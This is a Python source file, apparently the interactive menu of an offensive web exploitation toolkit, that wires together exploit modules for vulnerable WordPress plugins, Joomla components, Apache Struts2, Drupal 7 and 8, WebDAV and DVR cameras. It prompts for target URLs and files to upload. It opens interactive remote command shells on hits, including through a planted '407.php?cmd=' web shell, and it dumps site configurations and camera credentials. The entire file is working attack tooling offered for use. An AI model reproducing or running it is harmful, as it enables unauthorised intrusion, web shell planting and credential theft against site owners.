#-*- coding: utf-8 -*-
from .exploit import wordpress_exploit as wp
from .exploit import joomla_exploit as joo
from .exploit import other_exploit as oth
from .tmp.modules import log_,show,exploit_modules,description
import requests,readline

class exploit(
    wp.wp_content_injection,
    wp.wp_revslider,
    wp.wp_learndash,
    wp.wp_showbiz,
    wp.wp_audio_control,
    joo.joomla_com_fabrik,
    joo.joomla_com_ads_manager,
    joo.joomla_manager_get_config,
    joo.joomla_com_jdownload,
    oth.apache_struts2_rce,
    oth.drupal_version7_rce,
    oth.drupal_version8_rce,
    oth.dvr_cam_leak_credential,
    oth.webdav_file_upload):
      pass
      
sss = []
for i in exploit_modules:
    xx = exploit_modules[i]
    for x in xx:
        sss.append(x)
        
logging = log_()
class exploit_main(object):

      def url(self,t):
          self.t = t
          if self.t.startswith('https://') or self.t.startswith('http://'):
             return self.t
          else:
             if self.t.startswith('www'):
                return f'https://{self.t}'
             else:
                return f'http://{self.t}'
                
      def cek(self,status,urls):
          self.status = status
          self.urls = urls
          logging.log(10,f'upload to: \033[33m{self.urls}\033[0m')
          if self.status == 200:
             logging.log(10,'status: \033[92m{self.status}\330[0m')
             logging.log(50,'vulnerability')
          else:
             logging.log(10,f'status: \033[91m{self.status}\033[0m')
             logging.log(30,'not vulnerability')
             
      def drupal(self,drupal_url,p):
          self.drupal_url = drupal_url
          self.p = p
          r = requests.get(self.drupal_url,timeout=7)
          if r.headers.get('X-Generator') == f'Drupal {self.p} (http://drupal.org)':
             return True
          else:
             return False
                          
      def struts(self,target):
          self.target = target
          logging.log(10,'checking vulnerability')
          test = exploit().strutsRCE(self.target,'whoami')
          if len(test) > 50:
             logging.log(30,f'not vulnerability! {self.target}')
          else:
             logging.log(50,'vulnerability')
             logging.log(20,'type "exit" for stop command')
             while True:
                   com = input('command:-$ ')
                   if com == 'exit':
                      break
                   else:
                      print(exploit().strutsRCE(self.target,com))
                      
      def v7_(self,target):
          self.target = target
          logging.log(10,'checking vulnerability')
          if self.drupal(self.target,'7') == True:
             tes = exploit().v7(self.target,'echo KONTOL')
             if tes[0] == 'KONTOL':
                logging.log(50,'vulnerability!')
                logging.log(20,'type "exit" for stop command')
                while True:
                      cmd = input('command:-$ ')
                      if cmd == 'exit':
                         break
                      else:
                         print(exploit().v7(self.target,cmd))
             else:
               logging.log(30,'not vulnerability')
          else:
             logging.log(40,'the drupal version is not detected!')
             
      def v8_(self,target):
          self.target = target
          logging.log(10,'checking vulnerability')
          if self.drupal(self.target,'8') == True:
             ppk = exploit().v8(self.target)
             if ppk == True:
                logging.log(50,'vulnerability!')
                logging.log(20,'type "exit" for stop command')
                while True:
                      cmd = input('command:-$ ')
                      if cmd == 'exit':
                         break
                      else:
                         print(requests.get(f'{self.target}/407.php?cmd={cmd}').text)          
             else:
                logging.log(30,'not vulnerability')                      
          else:
             logging.log(40,'the drupal version is not detected!')
                
      def main(self):
          merah = '\033[91m' ## INDONESIA :v
          putih = '\033[0m'
          wp = exploit_modules['wordpress']
          jom = exploit_modules['joomla']
          oth = exploit_modules['other']
          TGT = 'url: '
          PF = 'path_file: '
          NM = 'upload_with_name: '
          ex = exploit()
          while True:
                try:
                    inp = input(f'zsf({merah}exploit{putih}): ').lower()
                    if inp == wp[0]:                      
                       ex.post_inject(self.url(input(TGT)),input('post_title: '),input('post_content: '))
                    elif inp == wp[1]:
                       x,y = ex._wp_revslider(
                        self.url(input(TGT)),
                        input(PF),
                        input(NM)
                       )
                       self.cek(x,y)
                    elif inp == wp[2]:
                       x,y = ex._wp_learndash(
                        self.url(input(TGT)),
                        input(PF),
                        input(NM)
                       )
                       self.cek(x,y)
                    elif inp == wp[3]:
                       x,y = ex._wp_showbiz(
                        self.url(input(TGT)),
                        input(PF),
                        input(NM)
                       )
                       self.cek(x,y)
                    elif inp == wp[4]:
                       x,y = ex._wp_audio_control(
                        self.url(input(TGT)),
                        input(PF),
                        input(NM)
                       )
                       self.cek(x,y)
                    elif inp == jom[0]:
                       x,y = ex.com_fabrik(
                        self.url(input(TGT)),
                        input(PF),
                        input(NM)
                       )
                       self.cek(x,y)
                    elif inp == jom[1]:
                       x,y = ex.com_ads_manager(
                        self.url(input(TGT)),
                        input(PF),
                        input(NM)
                       )
                       self.cek(x,y)
                    elif inp == jom[2]:
                       victim = self.url(input(TGT))
                       foo = ex.joomanager_get_config(victim)
                       if foo == None:
                          logging.log(30,'not vulnerability')
                       else:
                          for var,val in foo.items():
                              logging.log(50,f'{var}: {var}')
                    elif inp == jom[3]:
                       x,y = ex.com_jdownload(
                        self.url(input(TGT)),
                        input(PF),
                        input(NM)
                       )
                       self.cek(x,y)
                    elif inp == oth[0]:
                       x,y = ex.webdav(
                        self.url(input(TGT)),
                        input(PF),
                        input(NM)
                       )
                       self.cek(x,y)
                    elif inp == oth[1]:
                       self.struts(self.url(input(TGT)))
                    elif inp == oth[2]:
                       self.v7_(self.url(input(TGT)))
                    elif inp == oth[3]:
                       self.v8_(self.url(input(TGT)))
                    elif inp == oth[4]:
                       tes = ex.exploit(self.url(input(TGT)))
                       if tes == 'Not Vuln':
                          logging.log(30,'not vulnerability ')
                       else:
                          logging.log(20,'vulnerability!')
                          logging.log(50,f'user: {tes["list"][0]["uid"]}')
                          logging.log(50,f'user: {tes["list"][0]["pwd"]}')
                    elif inp == 'exit':
                       exit()
                    elif inp == 'back':
                       break
                       print('\n')
                    elif inp == 'help':
                       show(sss,description['exploit'])
                    else:
                       print(f'{merah}!{putih} no modules: {inp}')
                except Exception as e:
                    print(e)       
                except KeyboardInterrupt:
                    exit()
                      


                       
